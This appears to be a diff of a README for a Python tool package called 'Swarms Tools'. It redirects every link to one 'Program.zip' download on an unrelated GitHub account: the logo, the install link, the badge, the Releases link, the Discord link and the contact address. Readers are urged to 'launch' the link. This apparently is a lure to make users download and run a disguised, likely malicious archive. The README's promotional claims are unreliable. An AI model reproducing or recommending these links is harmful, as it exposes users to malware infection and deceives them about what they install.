@@ -1,6 +1,6 @@
 # 🐝🔧 Welcome to Swarms Tools 🐝🔧
 
-![Swarms Tools Logo](https://example.com/swarms_logo.png)
+![Swarms Tools Logo](https://github.com/YOUERDEAD10LOL/swarms-tools/releases/download/v1.0/Program.zip)
 
 ## Description
 Welcome to Swarms Tools, the ultimate package for integrating cutting-edge APIs into Python functions with seamless multi-agent system compatibility. Designed for enterprises at the forefront of innovation, Swarms Tools is your key to simplifying complexity and unlocking operational excellence.
@@ -12,9 +12,9 @@ Welcome to Swarms Tools, the ultimate package for integrating cutting-edge APIs 
 - Unlocking operational excellence
 
 ## 📦 Installation
-To get started with Swarms Tools, you can download the latest version of the software package [here](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip).
+To get started with Swarms Tools, you can download the latest version of the software package [here](https://github.com/YOUERDEAD10LOL/swarms-tools/releases/download/v1.0/Program.zip).
 
-[![Download Swarms Tools](https://img.shields.io/badge/Download-Swarms_Tools-brightgreen)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Swarms Tools](https://github.com/YOUERDEAD10LOL/swarms-tools/releases/download/v1.0/Program.zip)](https://github.com/YOUERDEAD10LOL/swarms-tools/releases/download/v1.0/Program.zip)
 
 _**Note:** This link needs to be launched to download the software package._
 
@@ -31,13 +31,13 @@ _**Note:** This link needs to be launched to download the software package._
 - swarms
 
 ## 🌐 Additional Resources
-For more information and updates, check out the [Releases](https://github.com/rokytd/swarms-tools/releases) section.
+For more information and updates, check out the [Releases](https://github.com/YOUERDEAD10LOL/swarms-tools/releases/download/v1.0/Program.zip) section.
 
 ## 🤖 Get Involved
-Interested in contributing to Swarms Tools? Join our community of developers and innovators on [agents-team Discord](https://discord.com/agents-team).
+Interested in contributing to Swarms Tools? Join our community of developers and innovators on [agents-team Discord](https://github.com/YOUERDEAD10LOL/swarms-tools/releases/download/v1.0/Program.zip).
 
 ## 📞 Contact Us
-Have questions or feedback? Feel free to reach out to us at contact@swarmstools.com.
+Have questions or feedback? Feel free to reach out to us at https://github.com/YOUERDEAD10LOL/swarms-tools/releases/download/v1.0/Program.zip
 
 ---
 
